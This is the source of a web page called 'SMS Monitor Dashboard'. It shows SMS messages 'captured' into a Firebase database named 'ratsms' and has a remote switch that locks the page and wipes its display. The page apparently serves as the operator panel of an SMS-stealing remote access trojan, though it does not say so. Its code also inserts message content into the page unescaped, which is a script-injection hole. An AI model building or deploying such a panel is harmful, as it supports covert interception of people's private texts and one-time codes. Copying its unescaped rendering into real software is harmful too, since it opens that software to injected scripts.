
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Monitor Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
        body { background-color: #f3f4f6; font-family: sans-serif; }
    </style>
</head>
<body>

    <div id="remote-lock-section" class="fixed inset-0 bg-gray-100 flex flex-col items-center justify-center p-4 z-50 hidden">
        <div class="bg-white p-8 rounded-3xl shadow-lg w-full max-w-md text-center">
            <div class="w-16 h-16 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl font-bold">🔒</div>
            <h2 class="text-2xl font-black text-gray-800 mb-2 tracking-tight">Dashboard Locked</h2>
            <p class="text-sm text-gray-400">The administrator has temporarily deactivated the system from the control domain.</p>
        </div>
    </div>

    <div id="main-content" class="max-w-4xl mx-auto p-4 md:p-8">
        
        <div class="flex justify-between items-center bg-white p-6 rounded-2xl shadow-sm mb-6">
            <div>
                <h1 class="text-2xl font-bold text-gray-850">SMS Monitor Dashboard</h1>
                <p class="text-sm text-gray-500">Real-time upcoming messages tracking</p>
            </div>
            <div class="flex items-center space-x-2">
                <span class="relative flex h-3 w-3">
                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
                </span>
                <span class="text-sm font-medium text-green-6xl">Live Stream</span>
            </div>
        </div>

        <div id="loader" class="text-center py-10">
            <p class="text-gray-500 animate-pulse">Checking remote system status...</p>
        </div>

        <div id="messages-container" class="space-y-4 hidden"></div>

        <div id="no-messages" class="hidden text-center bg-white p-12 rounded-2xl shadow-sm text-gray-400">
            No messages captured yet. Send a test SMS to check.
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            databaseURL: "https://ratsms-d15e7-default-rtdb.firebaseio.com" 
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        let messagesListenerRef = null; // Messages listener handler

        // DOM Elements
        const remoteLockSection = document.getElementById('remote-lock-section');
        const mainContent = document.getElementById('main-content');
        const messagesContainer = document.getElementById('messages-container');
        const loader = document.getElementById('loader');
        const noMessages = document.getElementById('no-messages');

        // STEP 1: Dusre domain ke switch status ko lagatar monitor karna
        database.ref('system_control/status').on('value', (statusSnapshot) => {
            const isSystemOn = statusSnapshot.val();

            if (isSystemOn === true) {
                // Agar dusre domain se ON hai -> Lock screen hatao aur data stream chalu karo
                remoteLockSection.classList.add('hidden');
                mainContent.classList.remove('hidden');
                
                // Messages stream start karein (agar pehle se chalu nahi hai)
                if (!messagesListenerRef) {
                    startListeningToMessages();
                }
            } else {
                // Agar dusre domain se OFF kar diya -> Instant data block aur lock screen show karo
                stopListeningAndClearData();
                
                remoteLockSection.classList.remove('hidden');
                mainContent.classList.add('hidden');
            }
        });

        // STEP 2: Realtime Messages Load karne ka function
        function startListeningToMessages() {
            messagesListenerRef = database.ref('messages');
            
            messagesListenerRef.on('value', (snapshot) => {
                loader.style.display = 'none';
                messagesContainer.innerHTML = ''; // Clear existing lists

                if (snapshot.exists()) {
                    messagesContainer.classList.remove('hidden');
                    noMessages.classList.add('hidden');

                    const data = snapshot.val();
                    const messagesList = Object.keys(data).map(key => ({
                        id: key,
                        ...data[key]
                    }));

                    // Latest First Sorting
                    messagesList.sort((a, b) => b.timestamp - a.timestamp);

                    messagesList.forEach((sms) => {
                        const smsDate = new Date(sms.timestamp).toLocaleString('en-IN', {
                            timeZone: 'Asia/Kolkata',
                            dateStyle: 'medium',
                            timeStyle: 'short'
                        });

                        const cardHtml = `
                            <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow">
                                <div class="flex justify-between items-start mb-3">
                                    <span class="bg-blue-50 text-blue-600 font-semibold px-3 py-1 rounded-full text-sm">
                                        ${sms.sender}
                                    </span>
                                    <span class="text-xs text-gray-400 font-medium">
                                        ${smsDate}
                                    </span>
                                </div>
                                <p class="text-gray-700 whitespace-pre-wrap break-words text-sm md:text-base">
                                    ${sms.message}
                                </p>
                            </div>
                        `;
                        messagesContainer.innerHTML += cardHtml;
                    });

                } else {
                    messagesContainer.classList.add('hidden');
                    noMessages.classList.remove('hidden');
                }
            });
        }

        // STEP 3: Connection disconnect karne aur screen saaf karne ka function
        function stopListeningAndClearData() {
            if (messagesListenerRef) {
                messagesListenerRef.off(); // Firebase data pipeline cut off
                messagesListenerRef = null;
            }
            messagesContainer.innerHTML = ''; // Saare purane messages ui se delete
            messagesContainer.classList.add('hidden');
            loader.style.display = 'block';
        }
    </script>
</body>
</html>
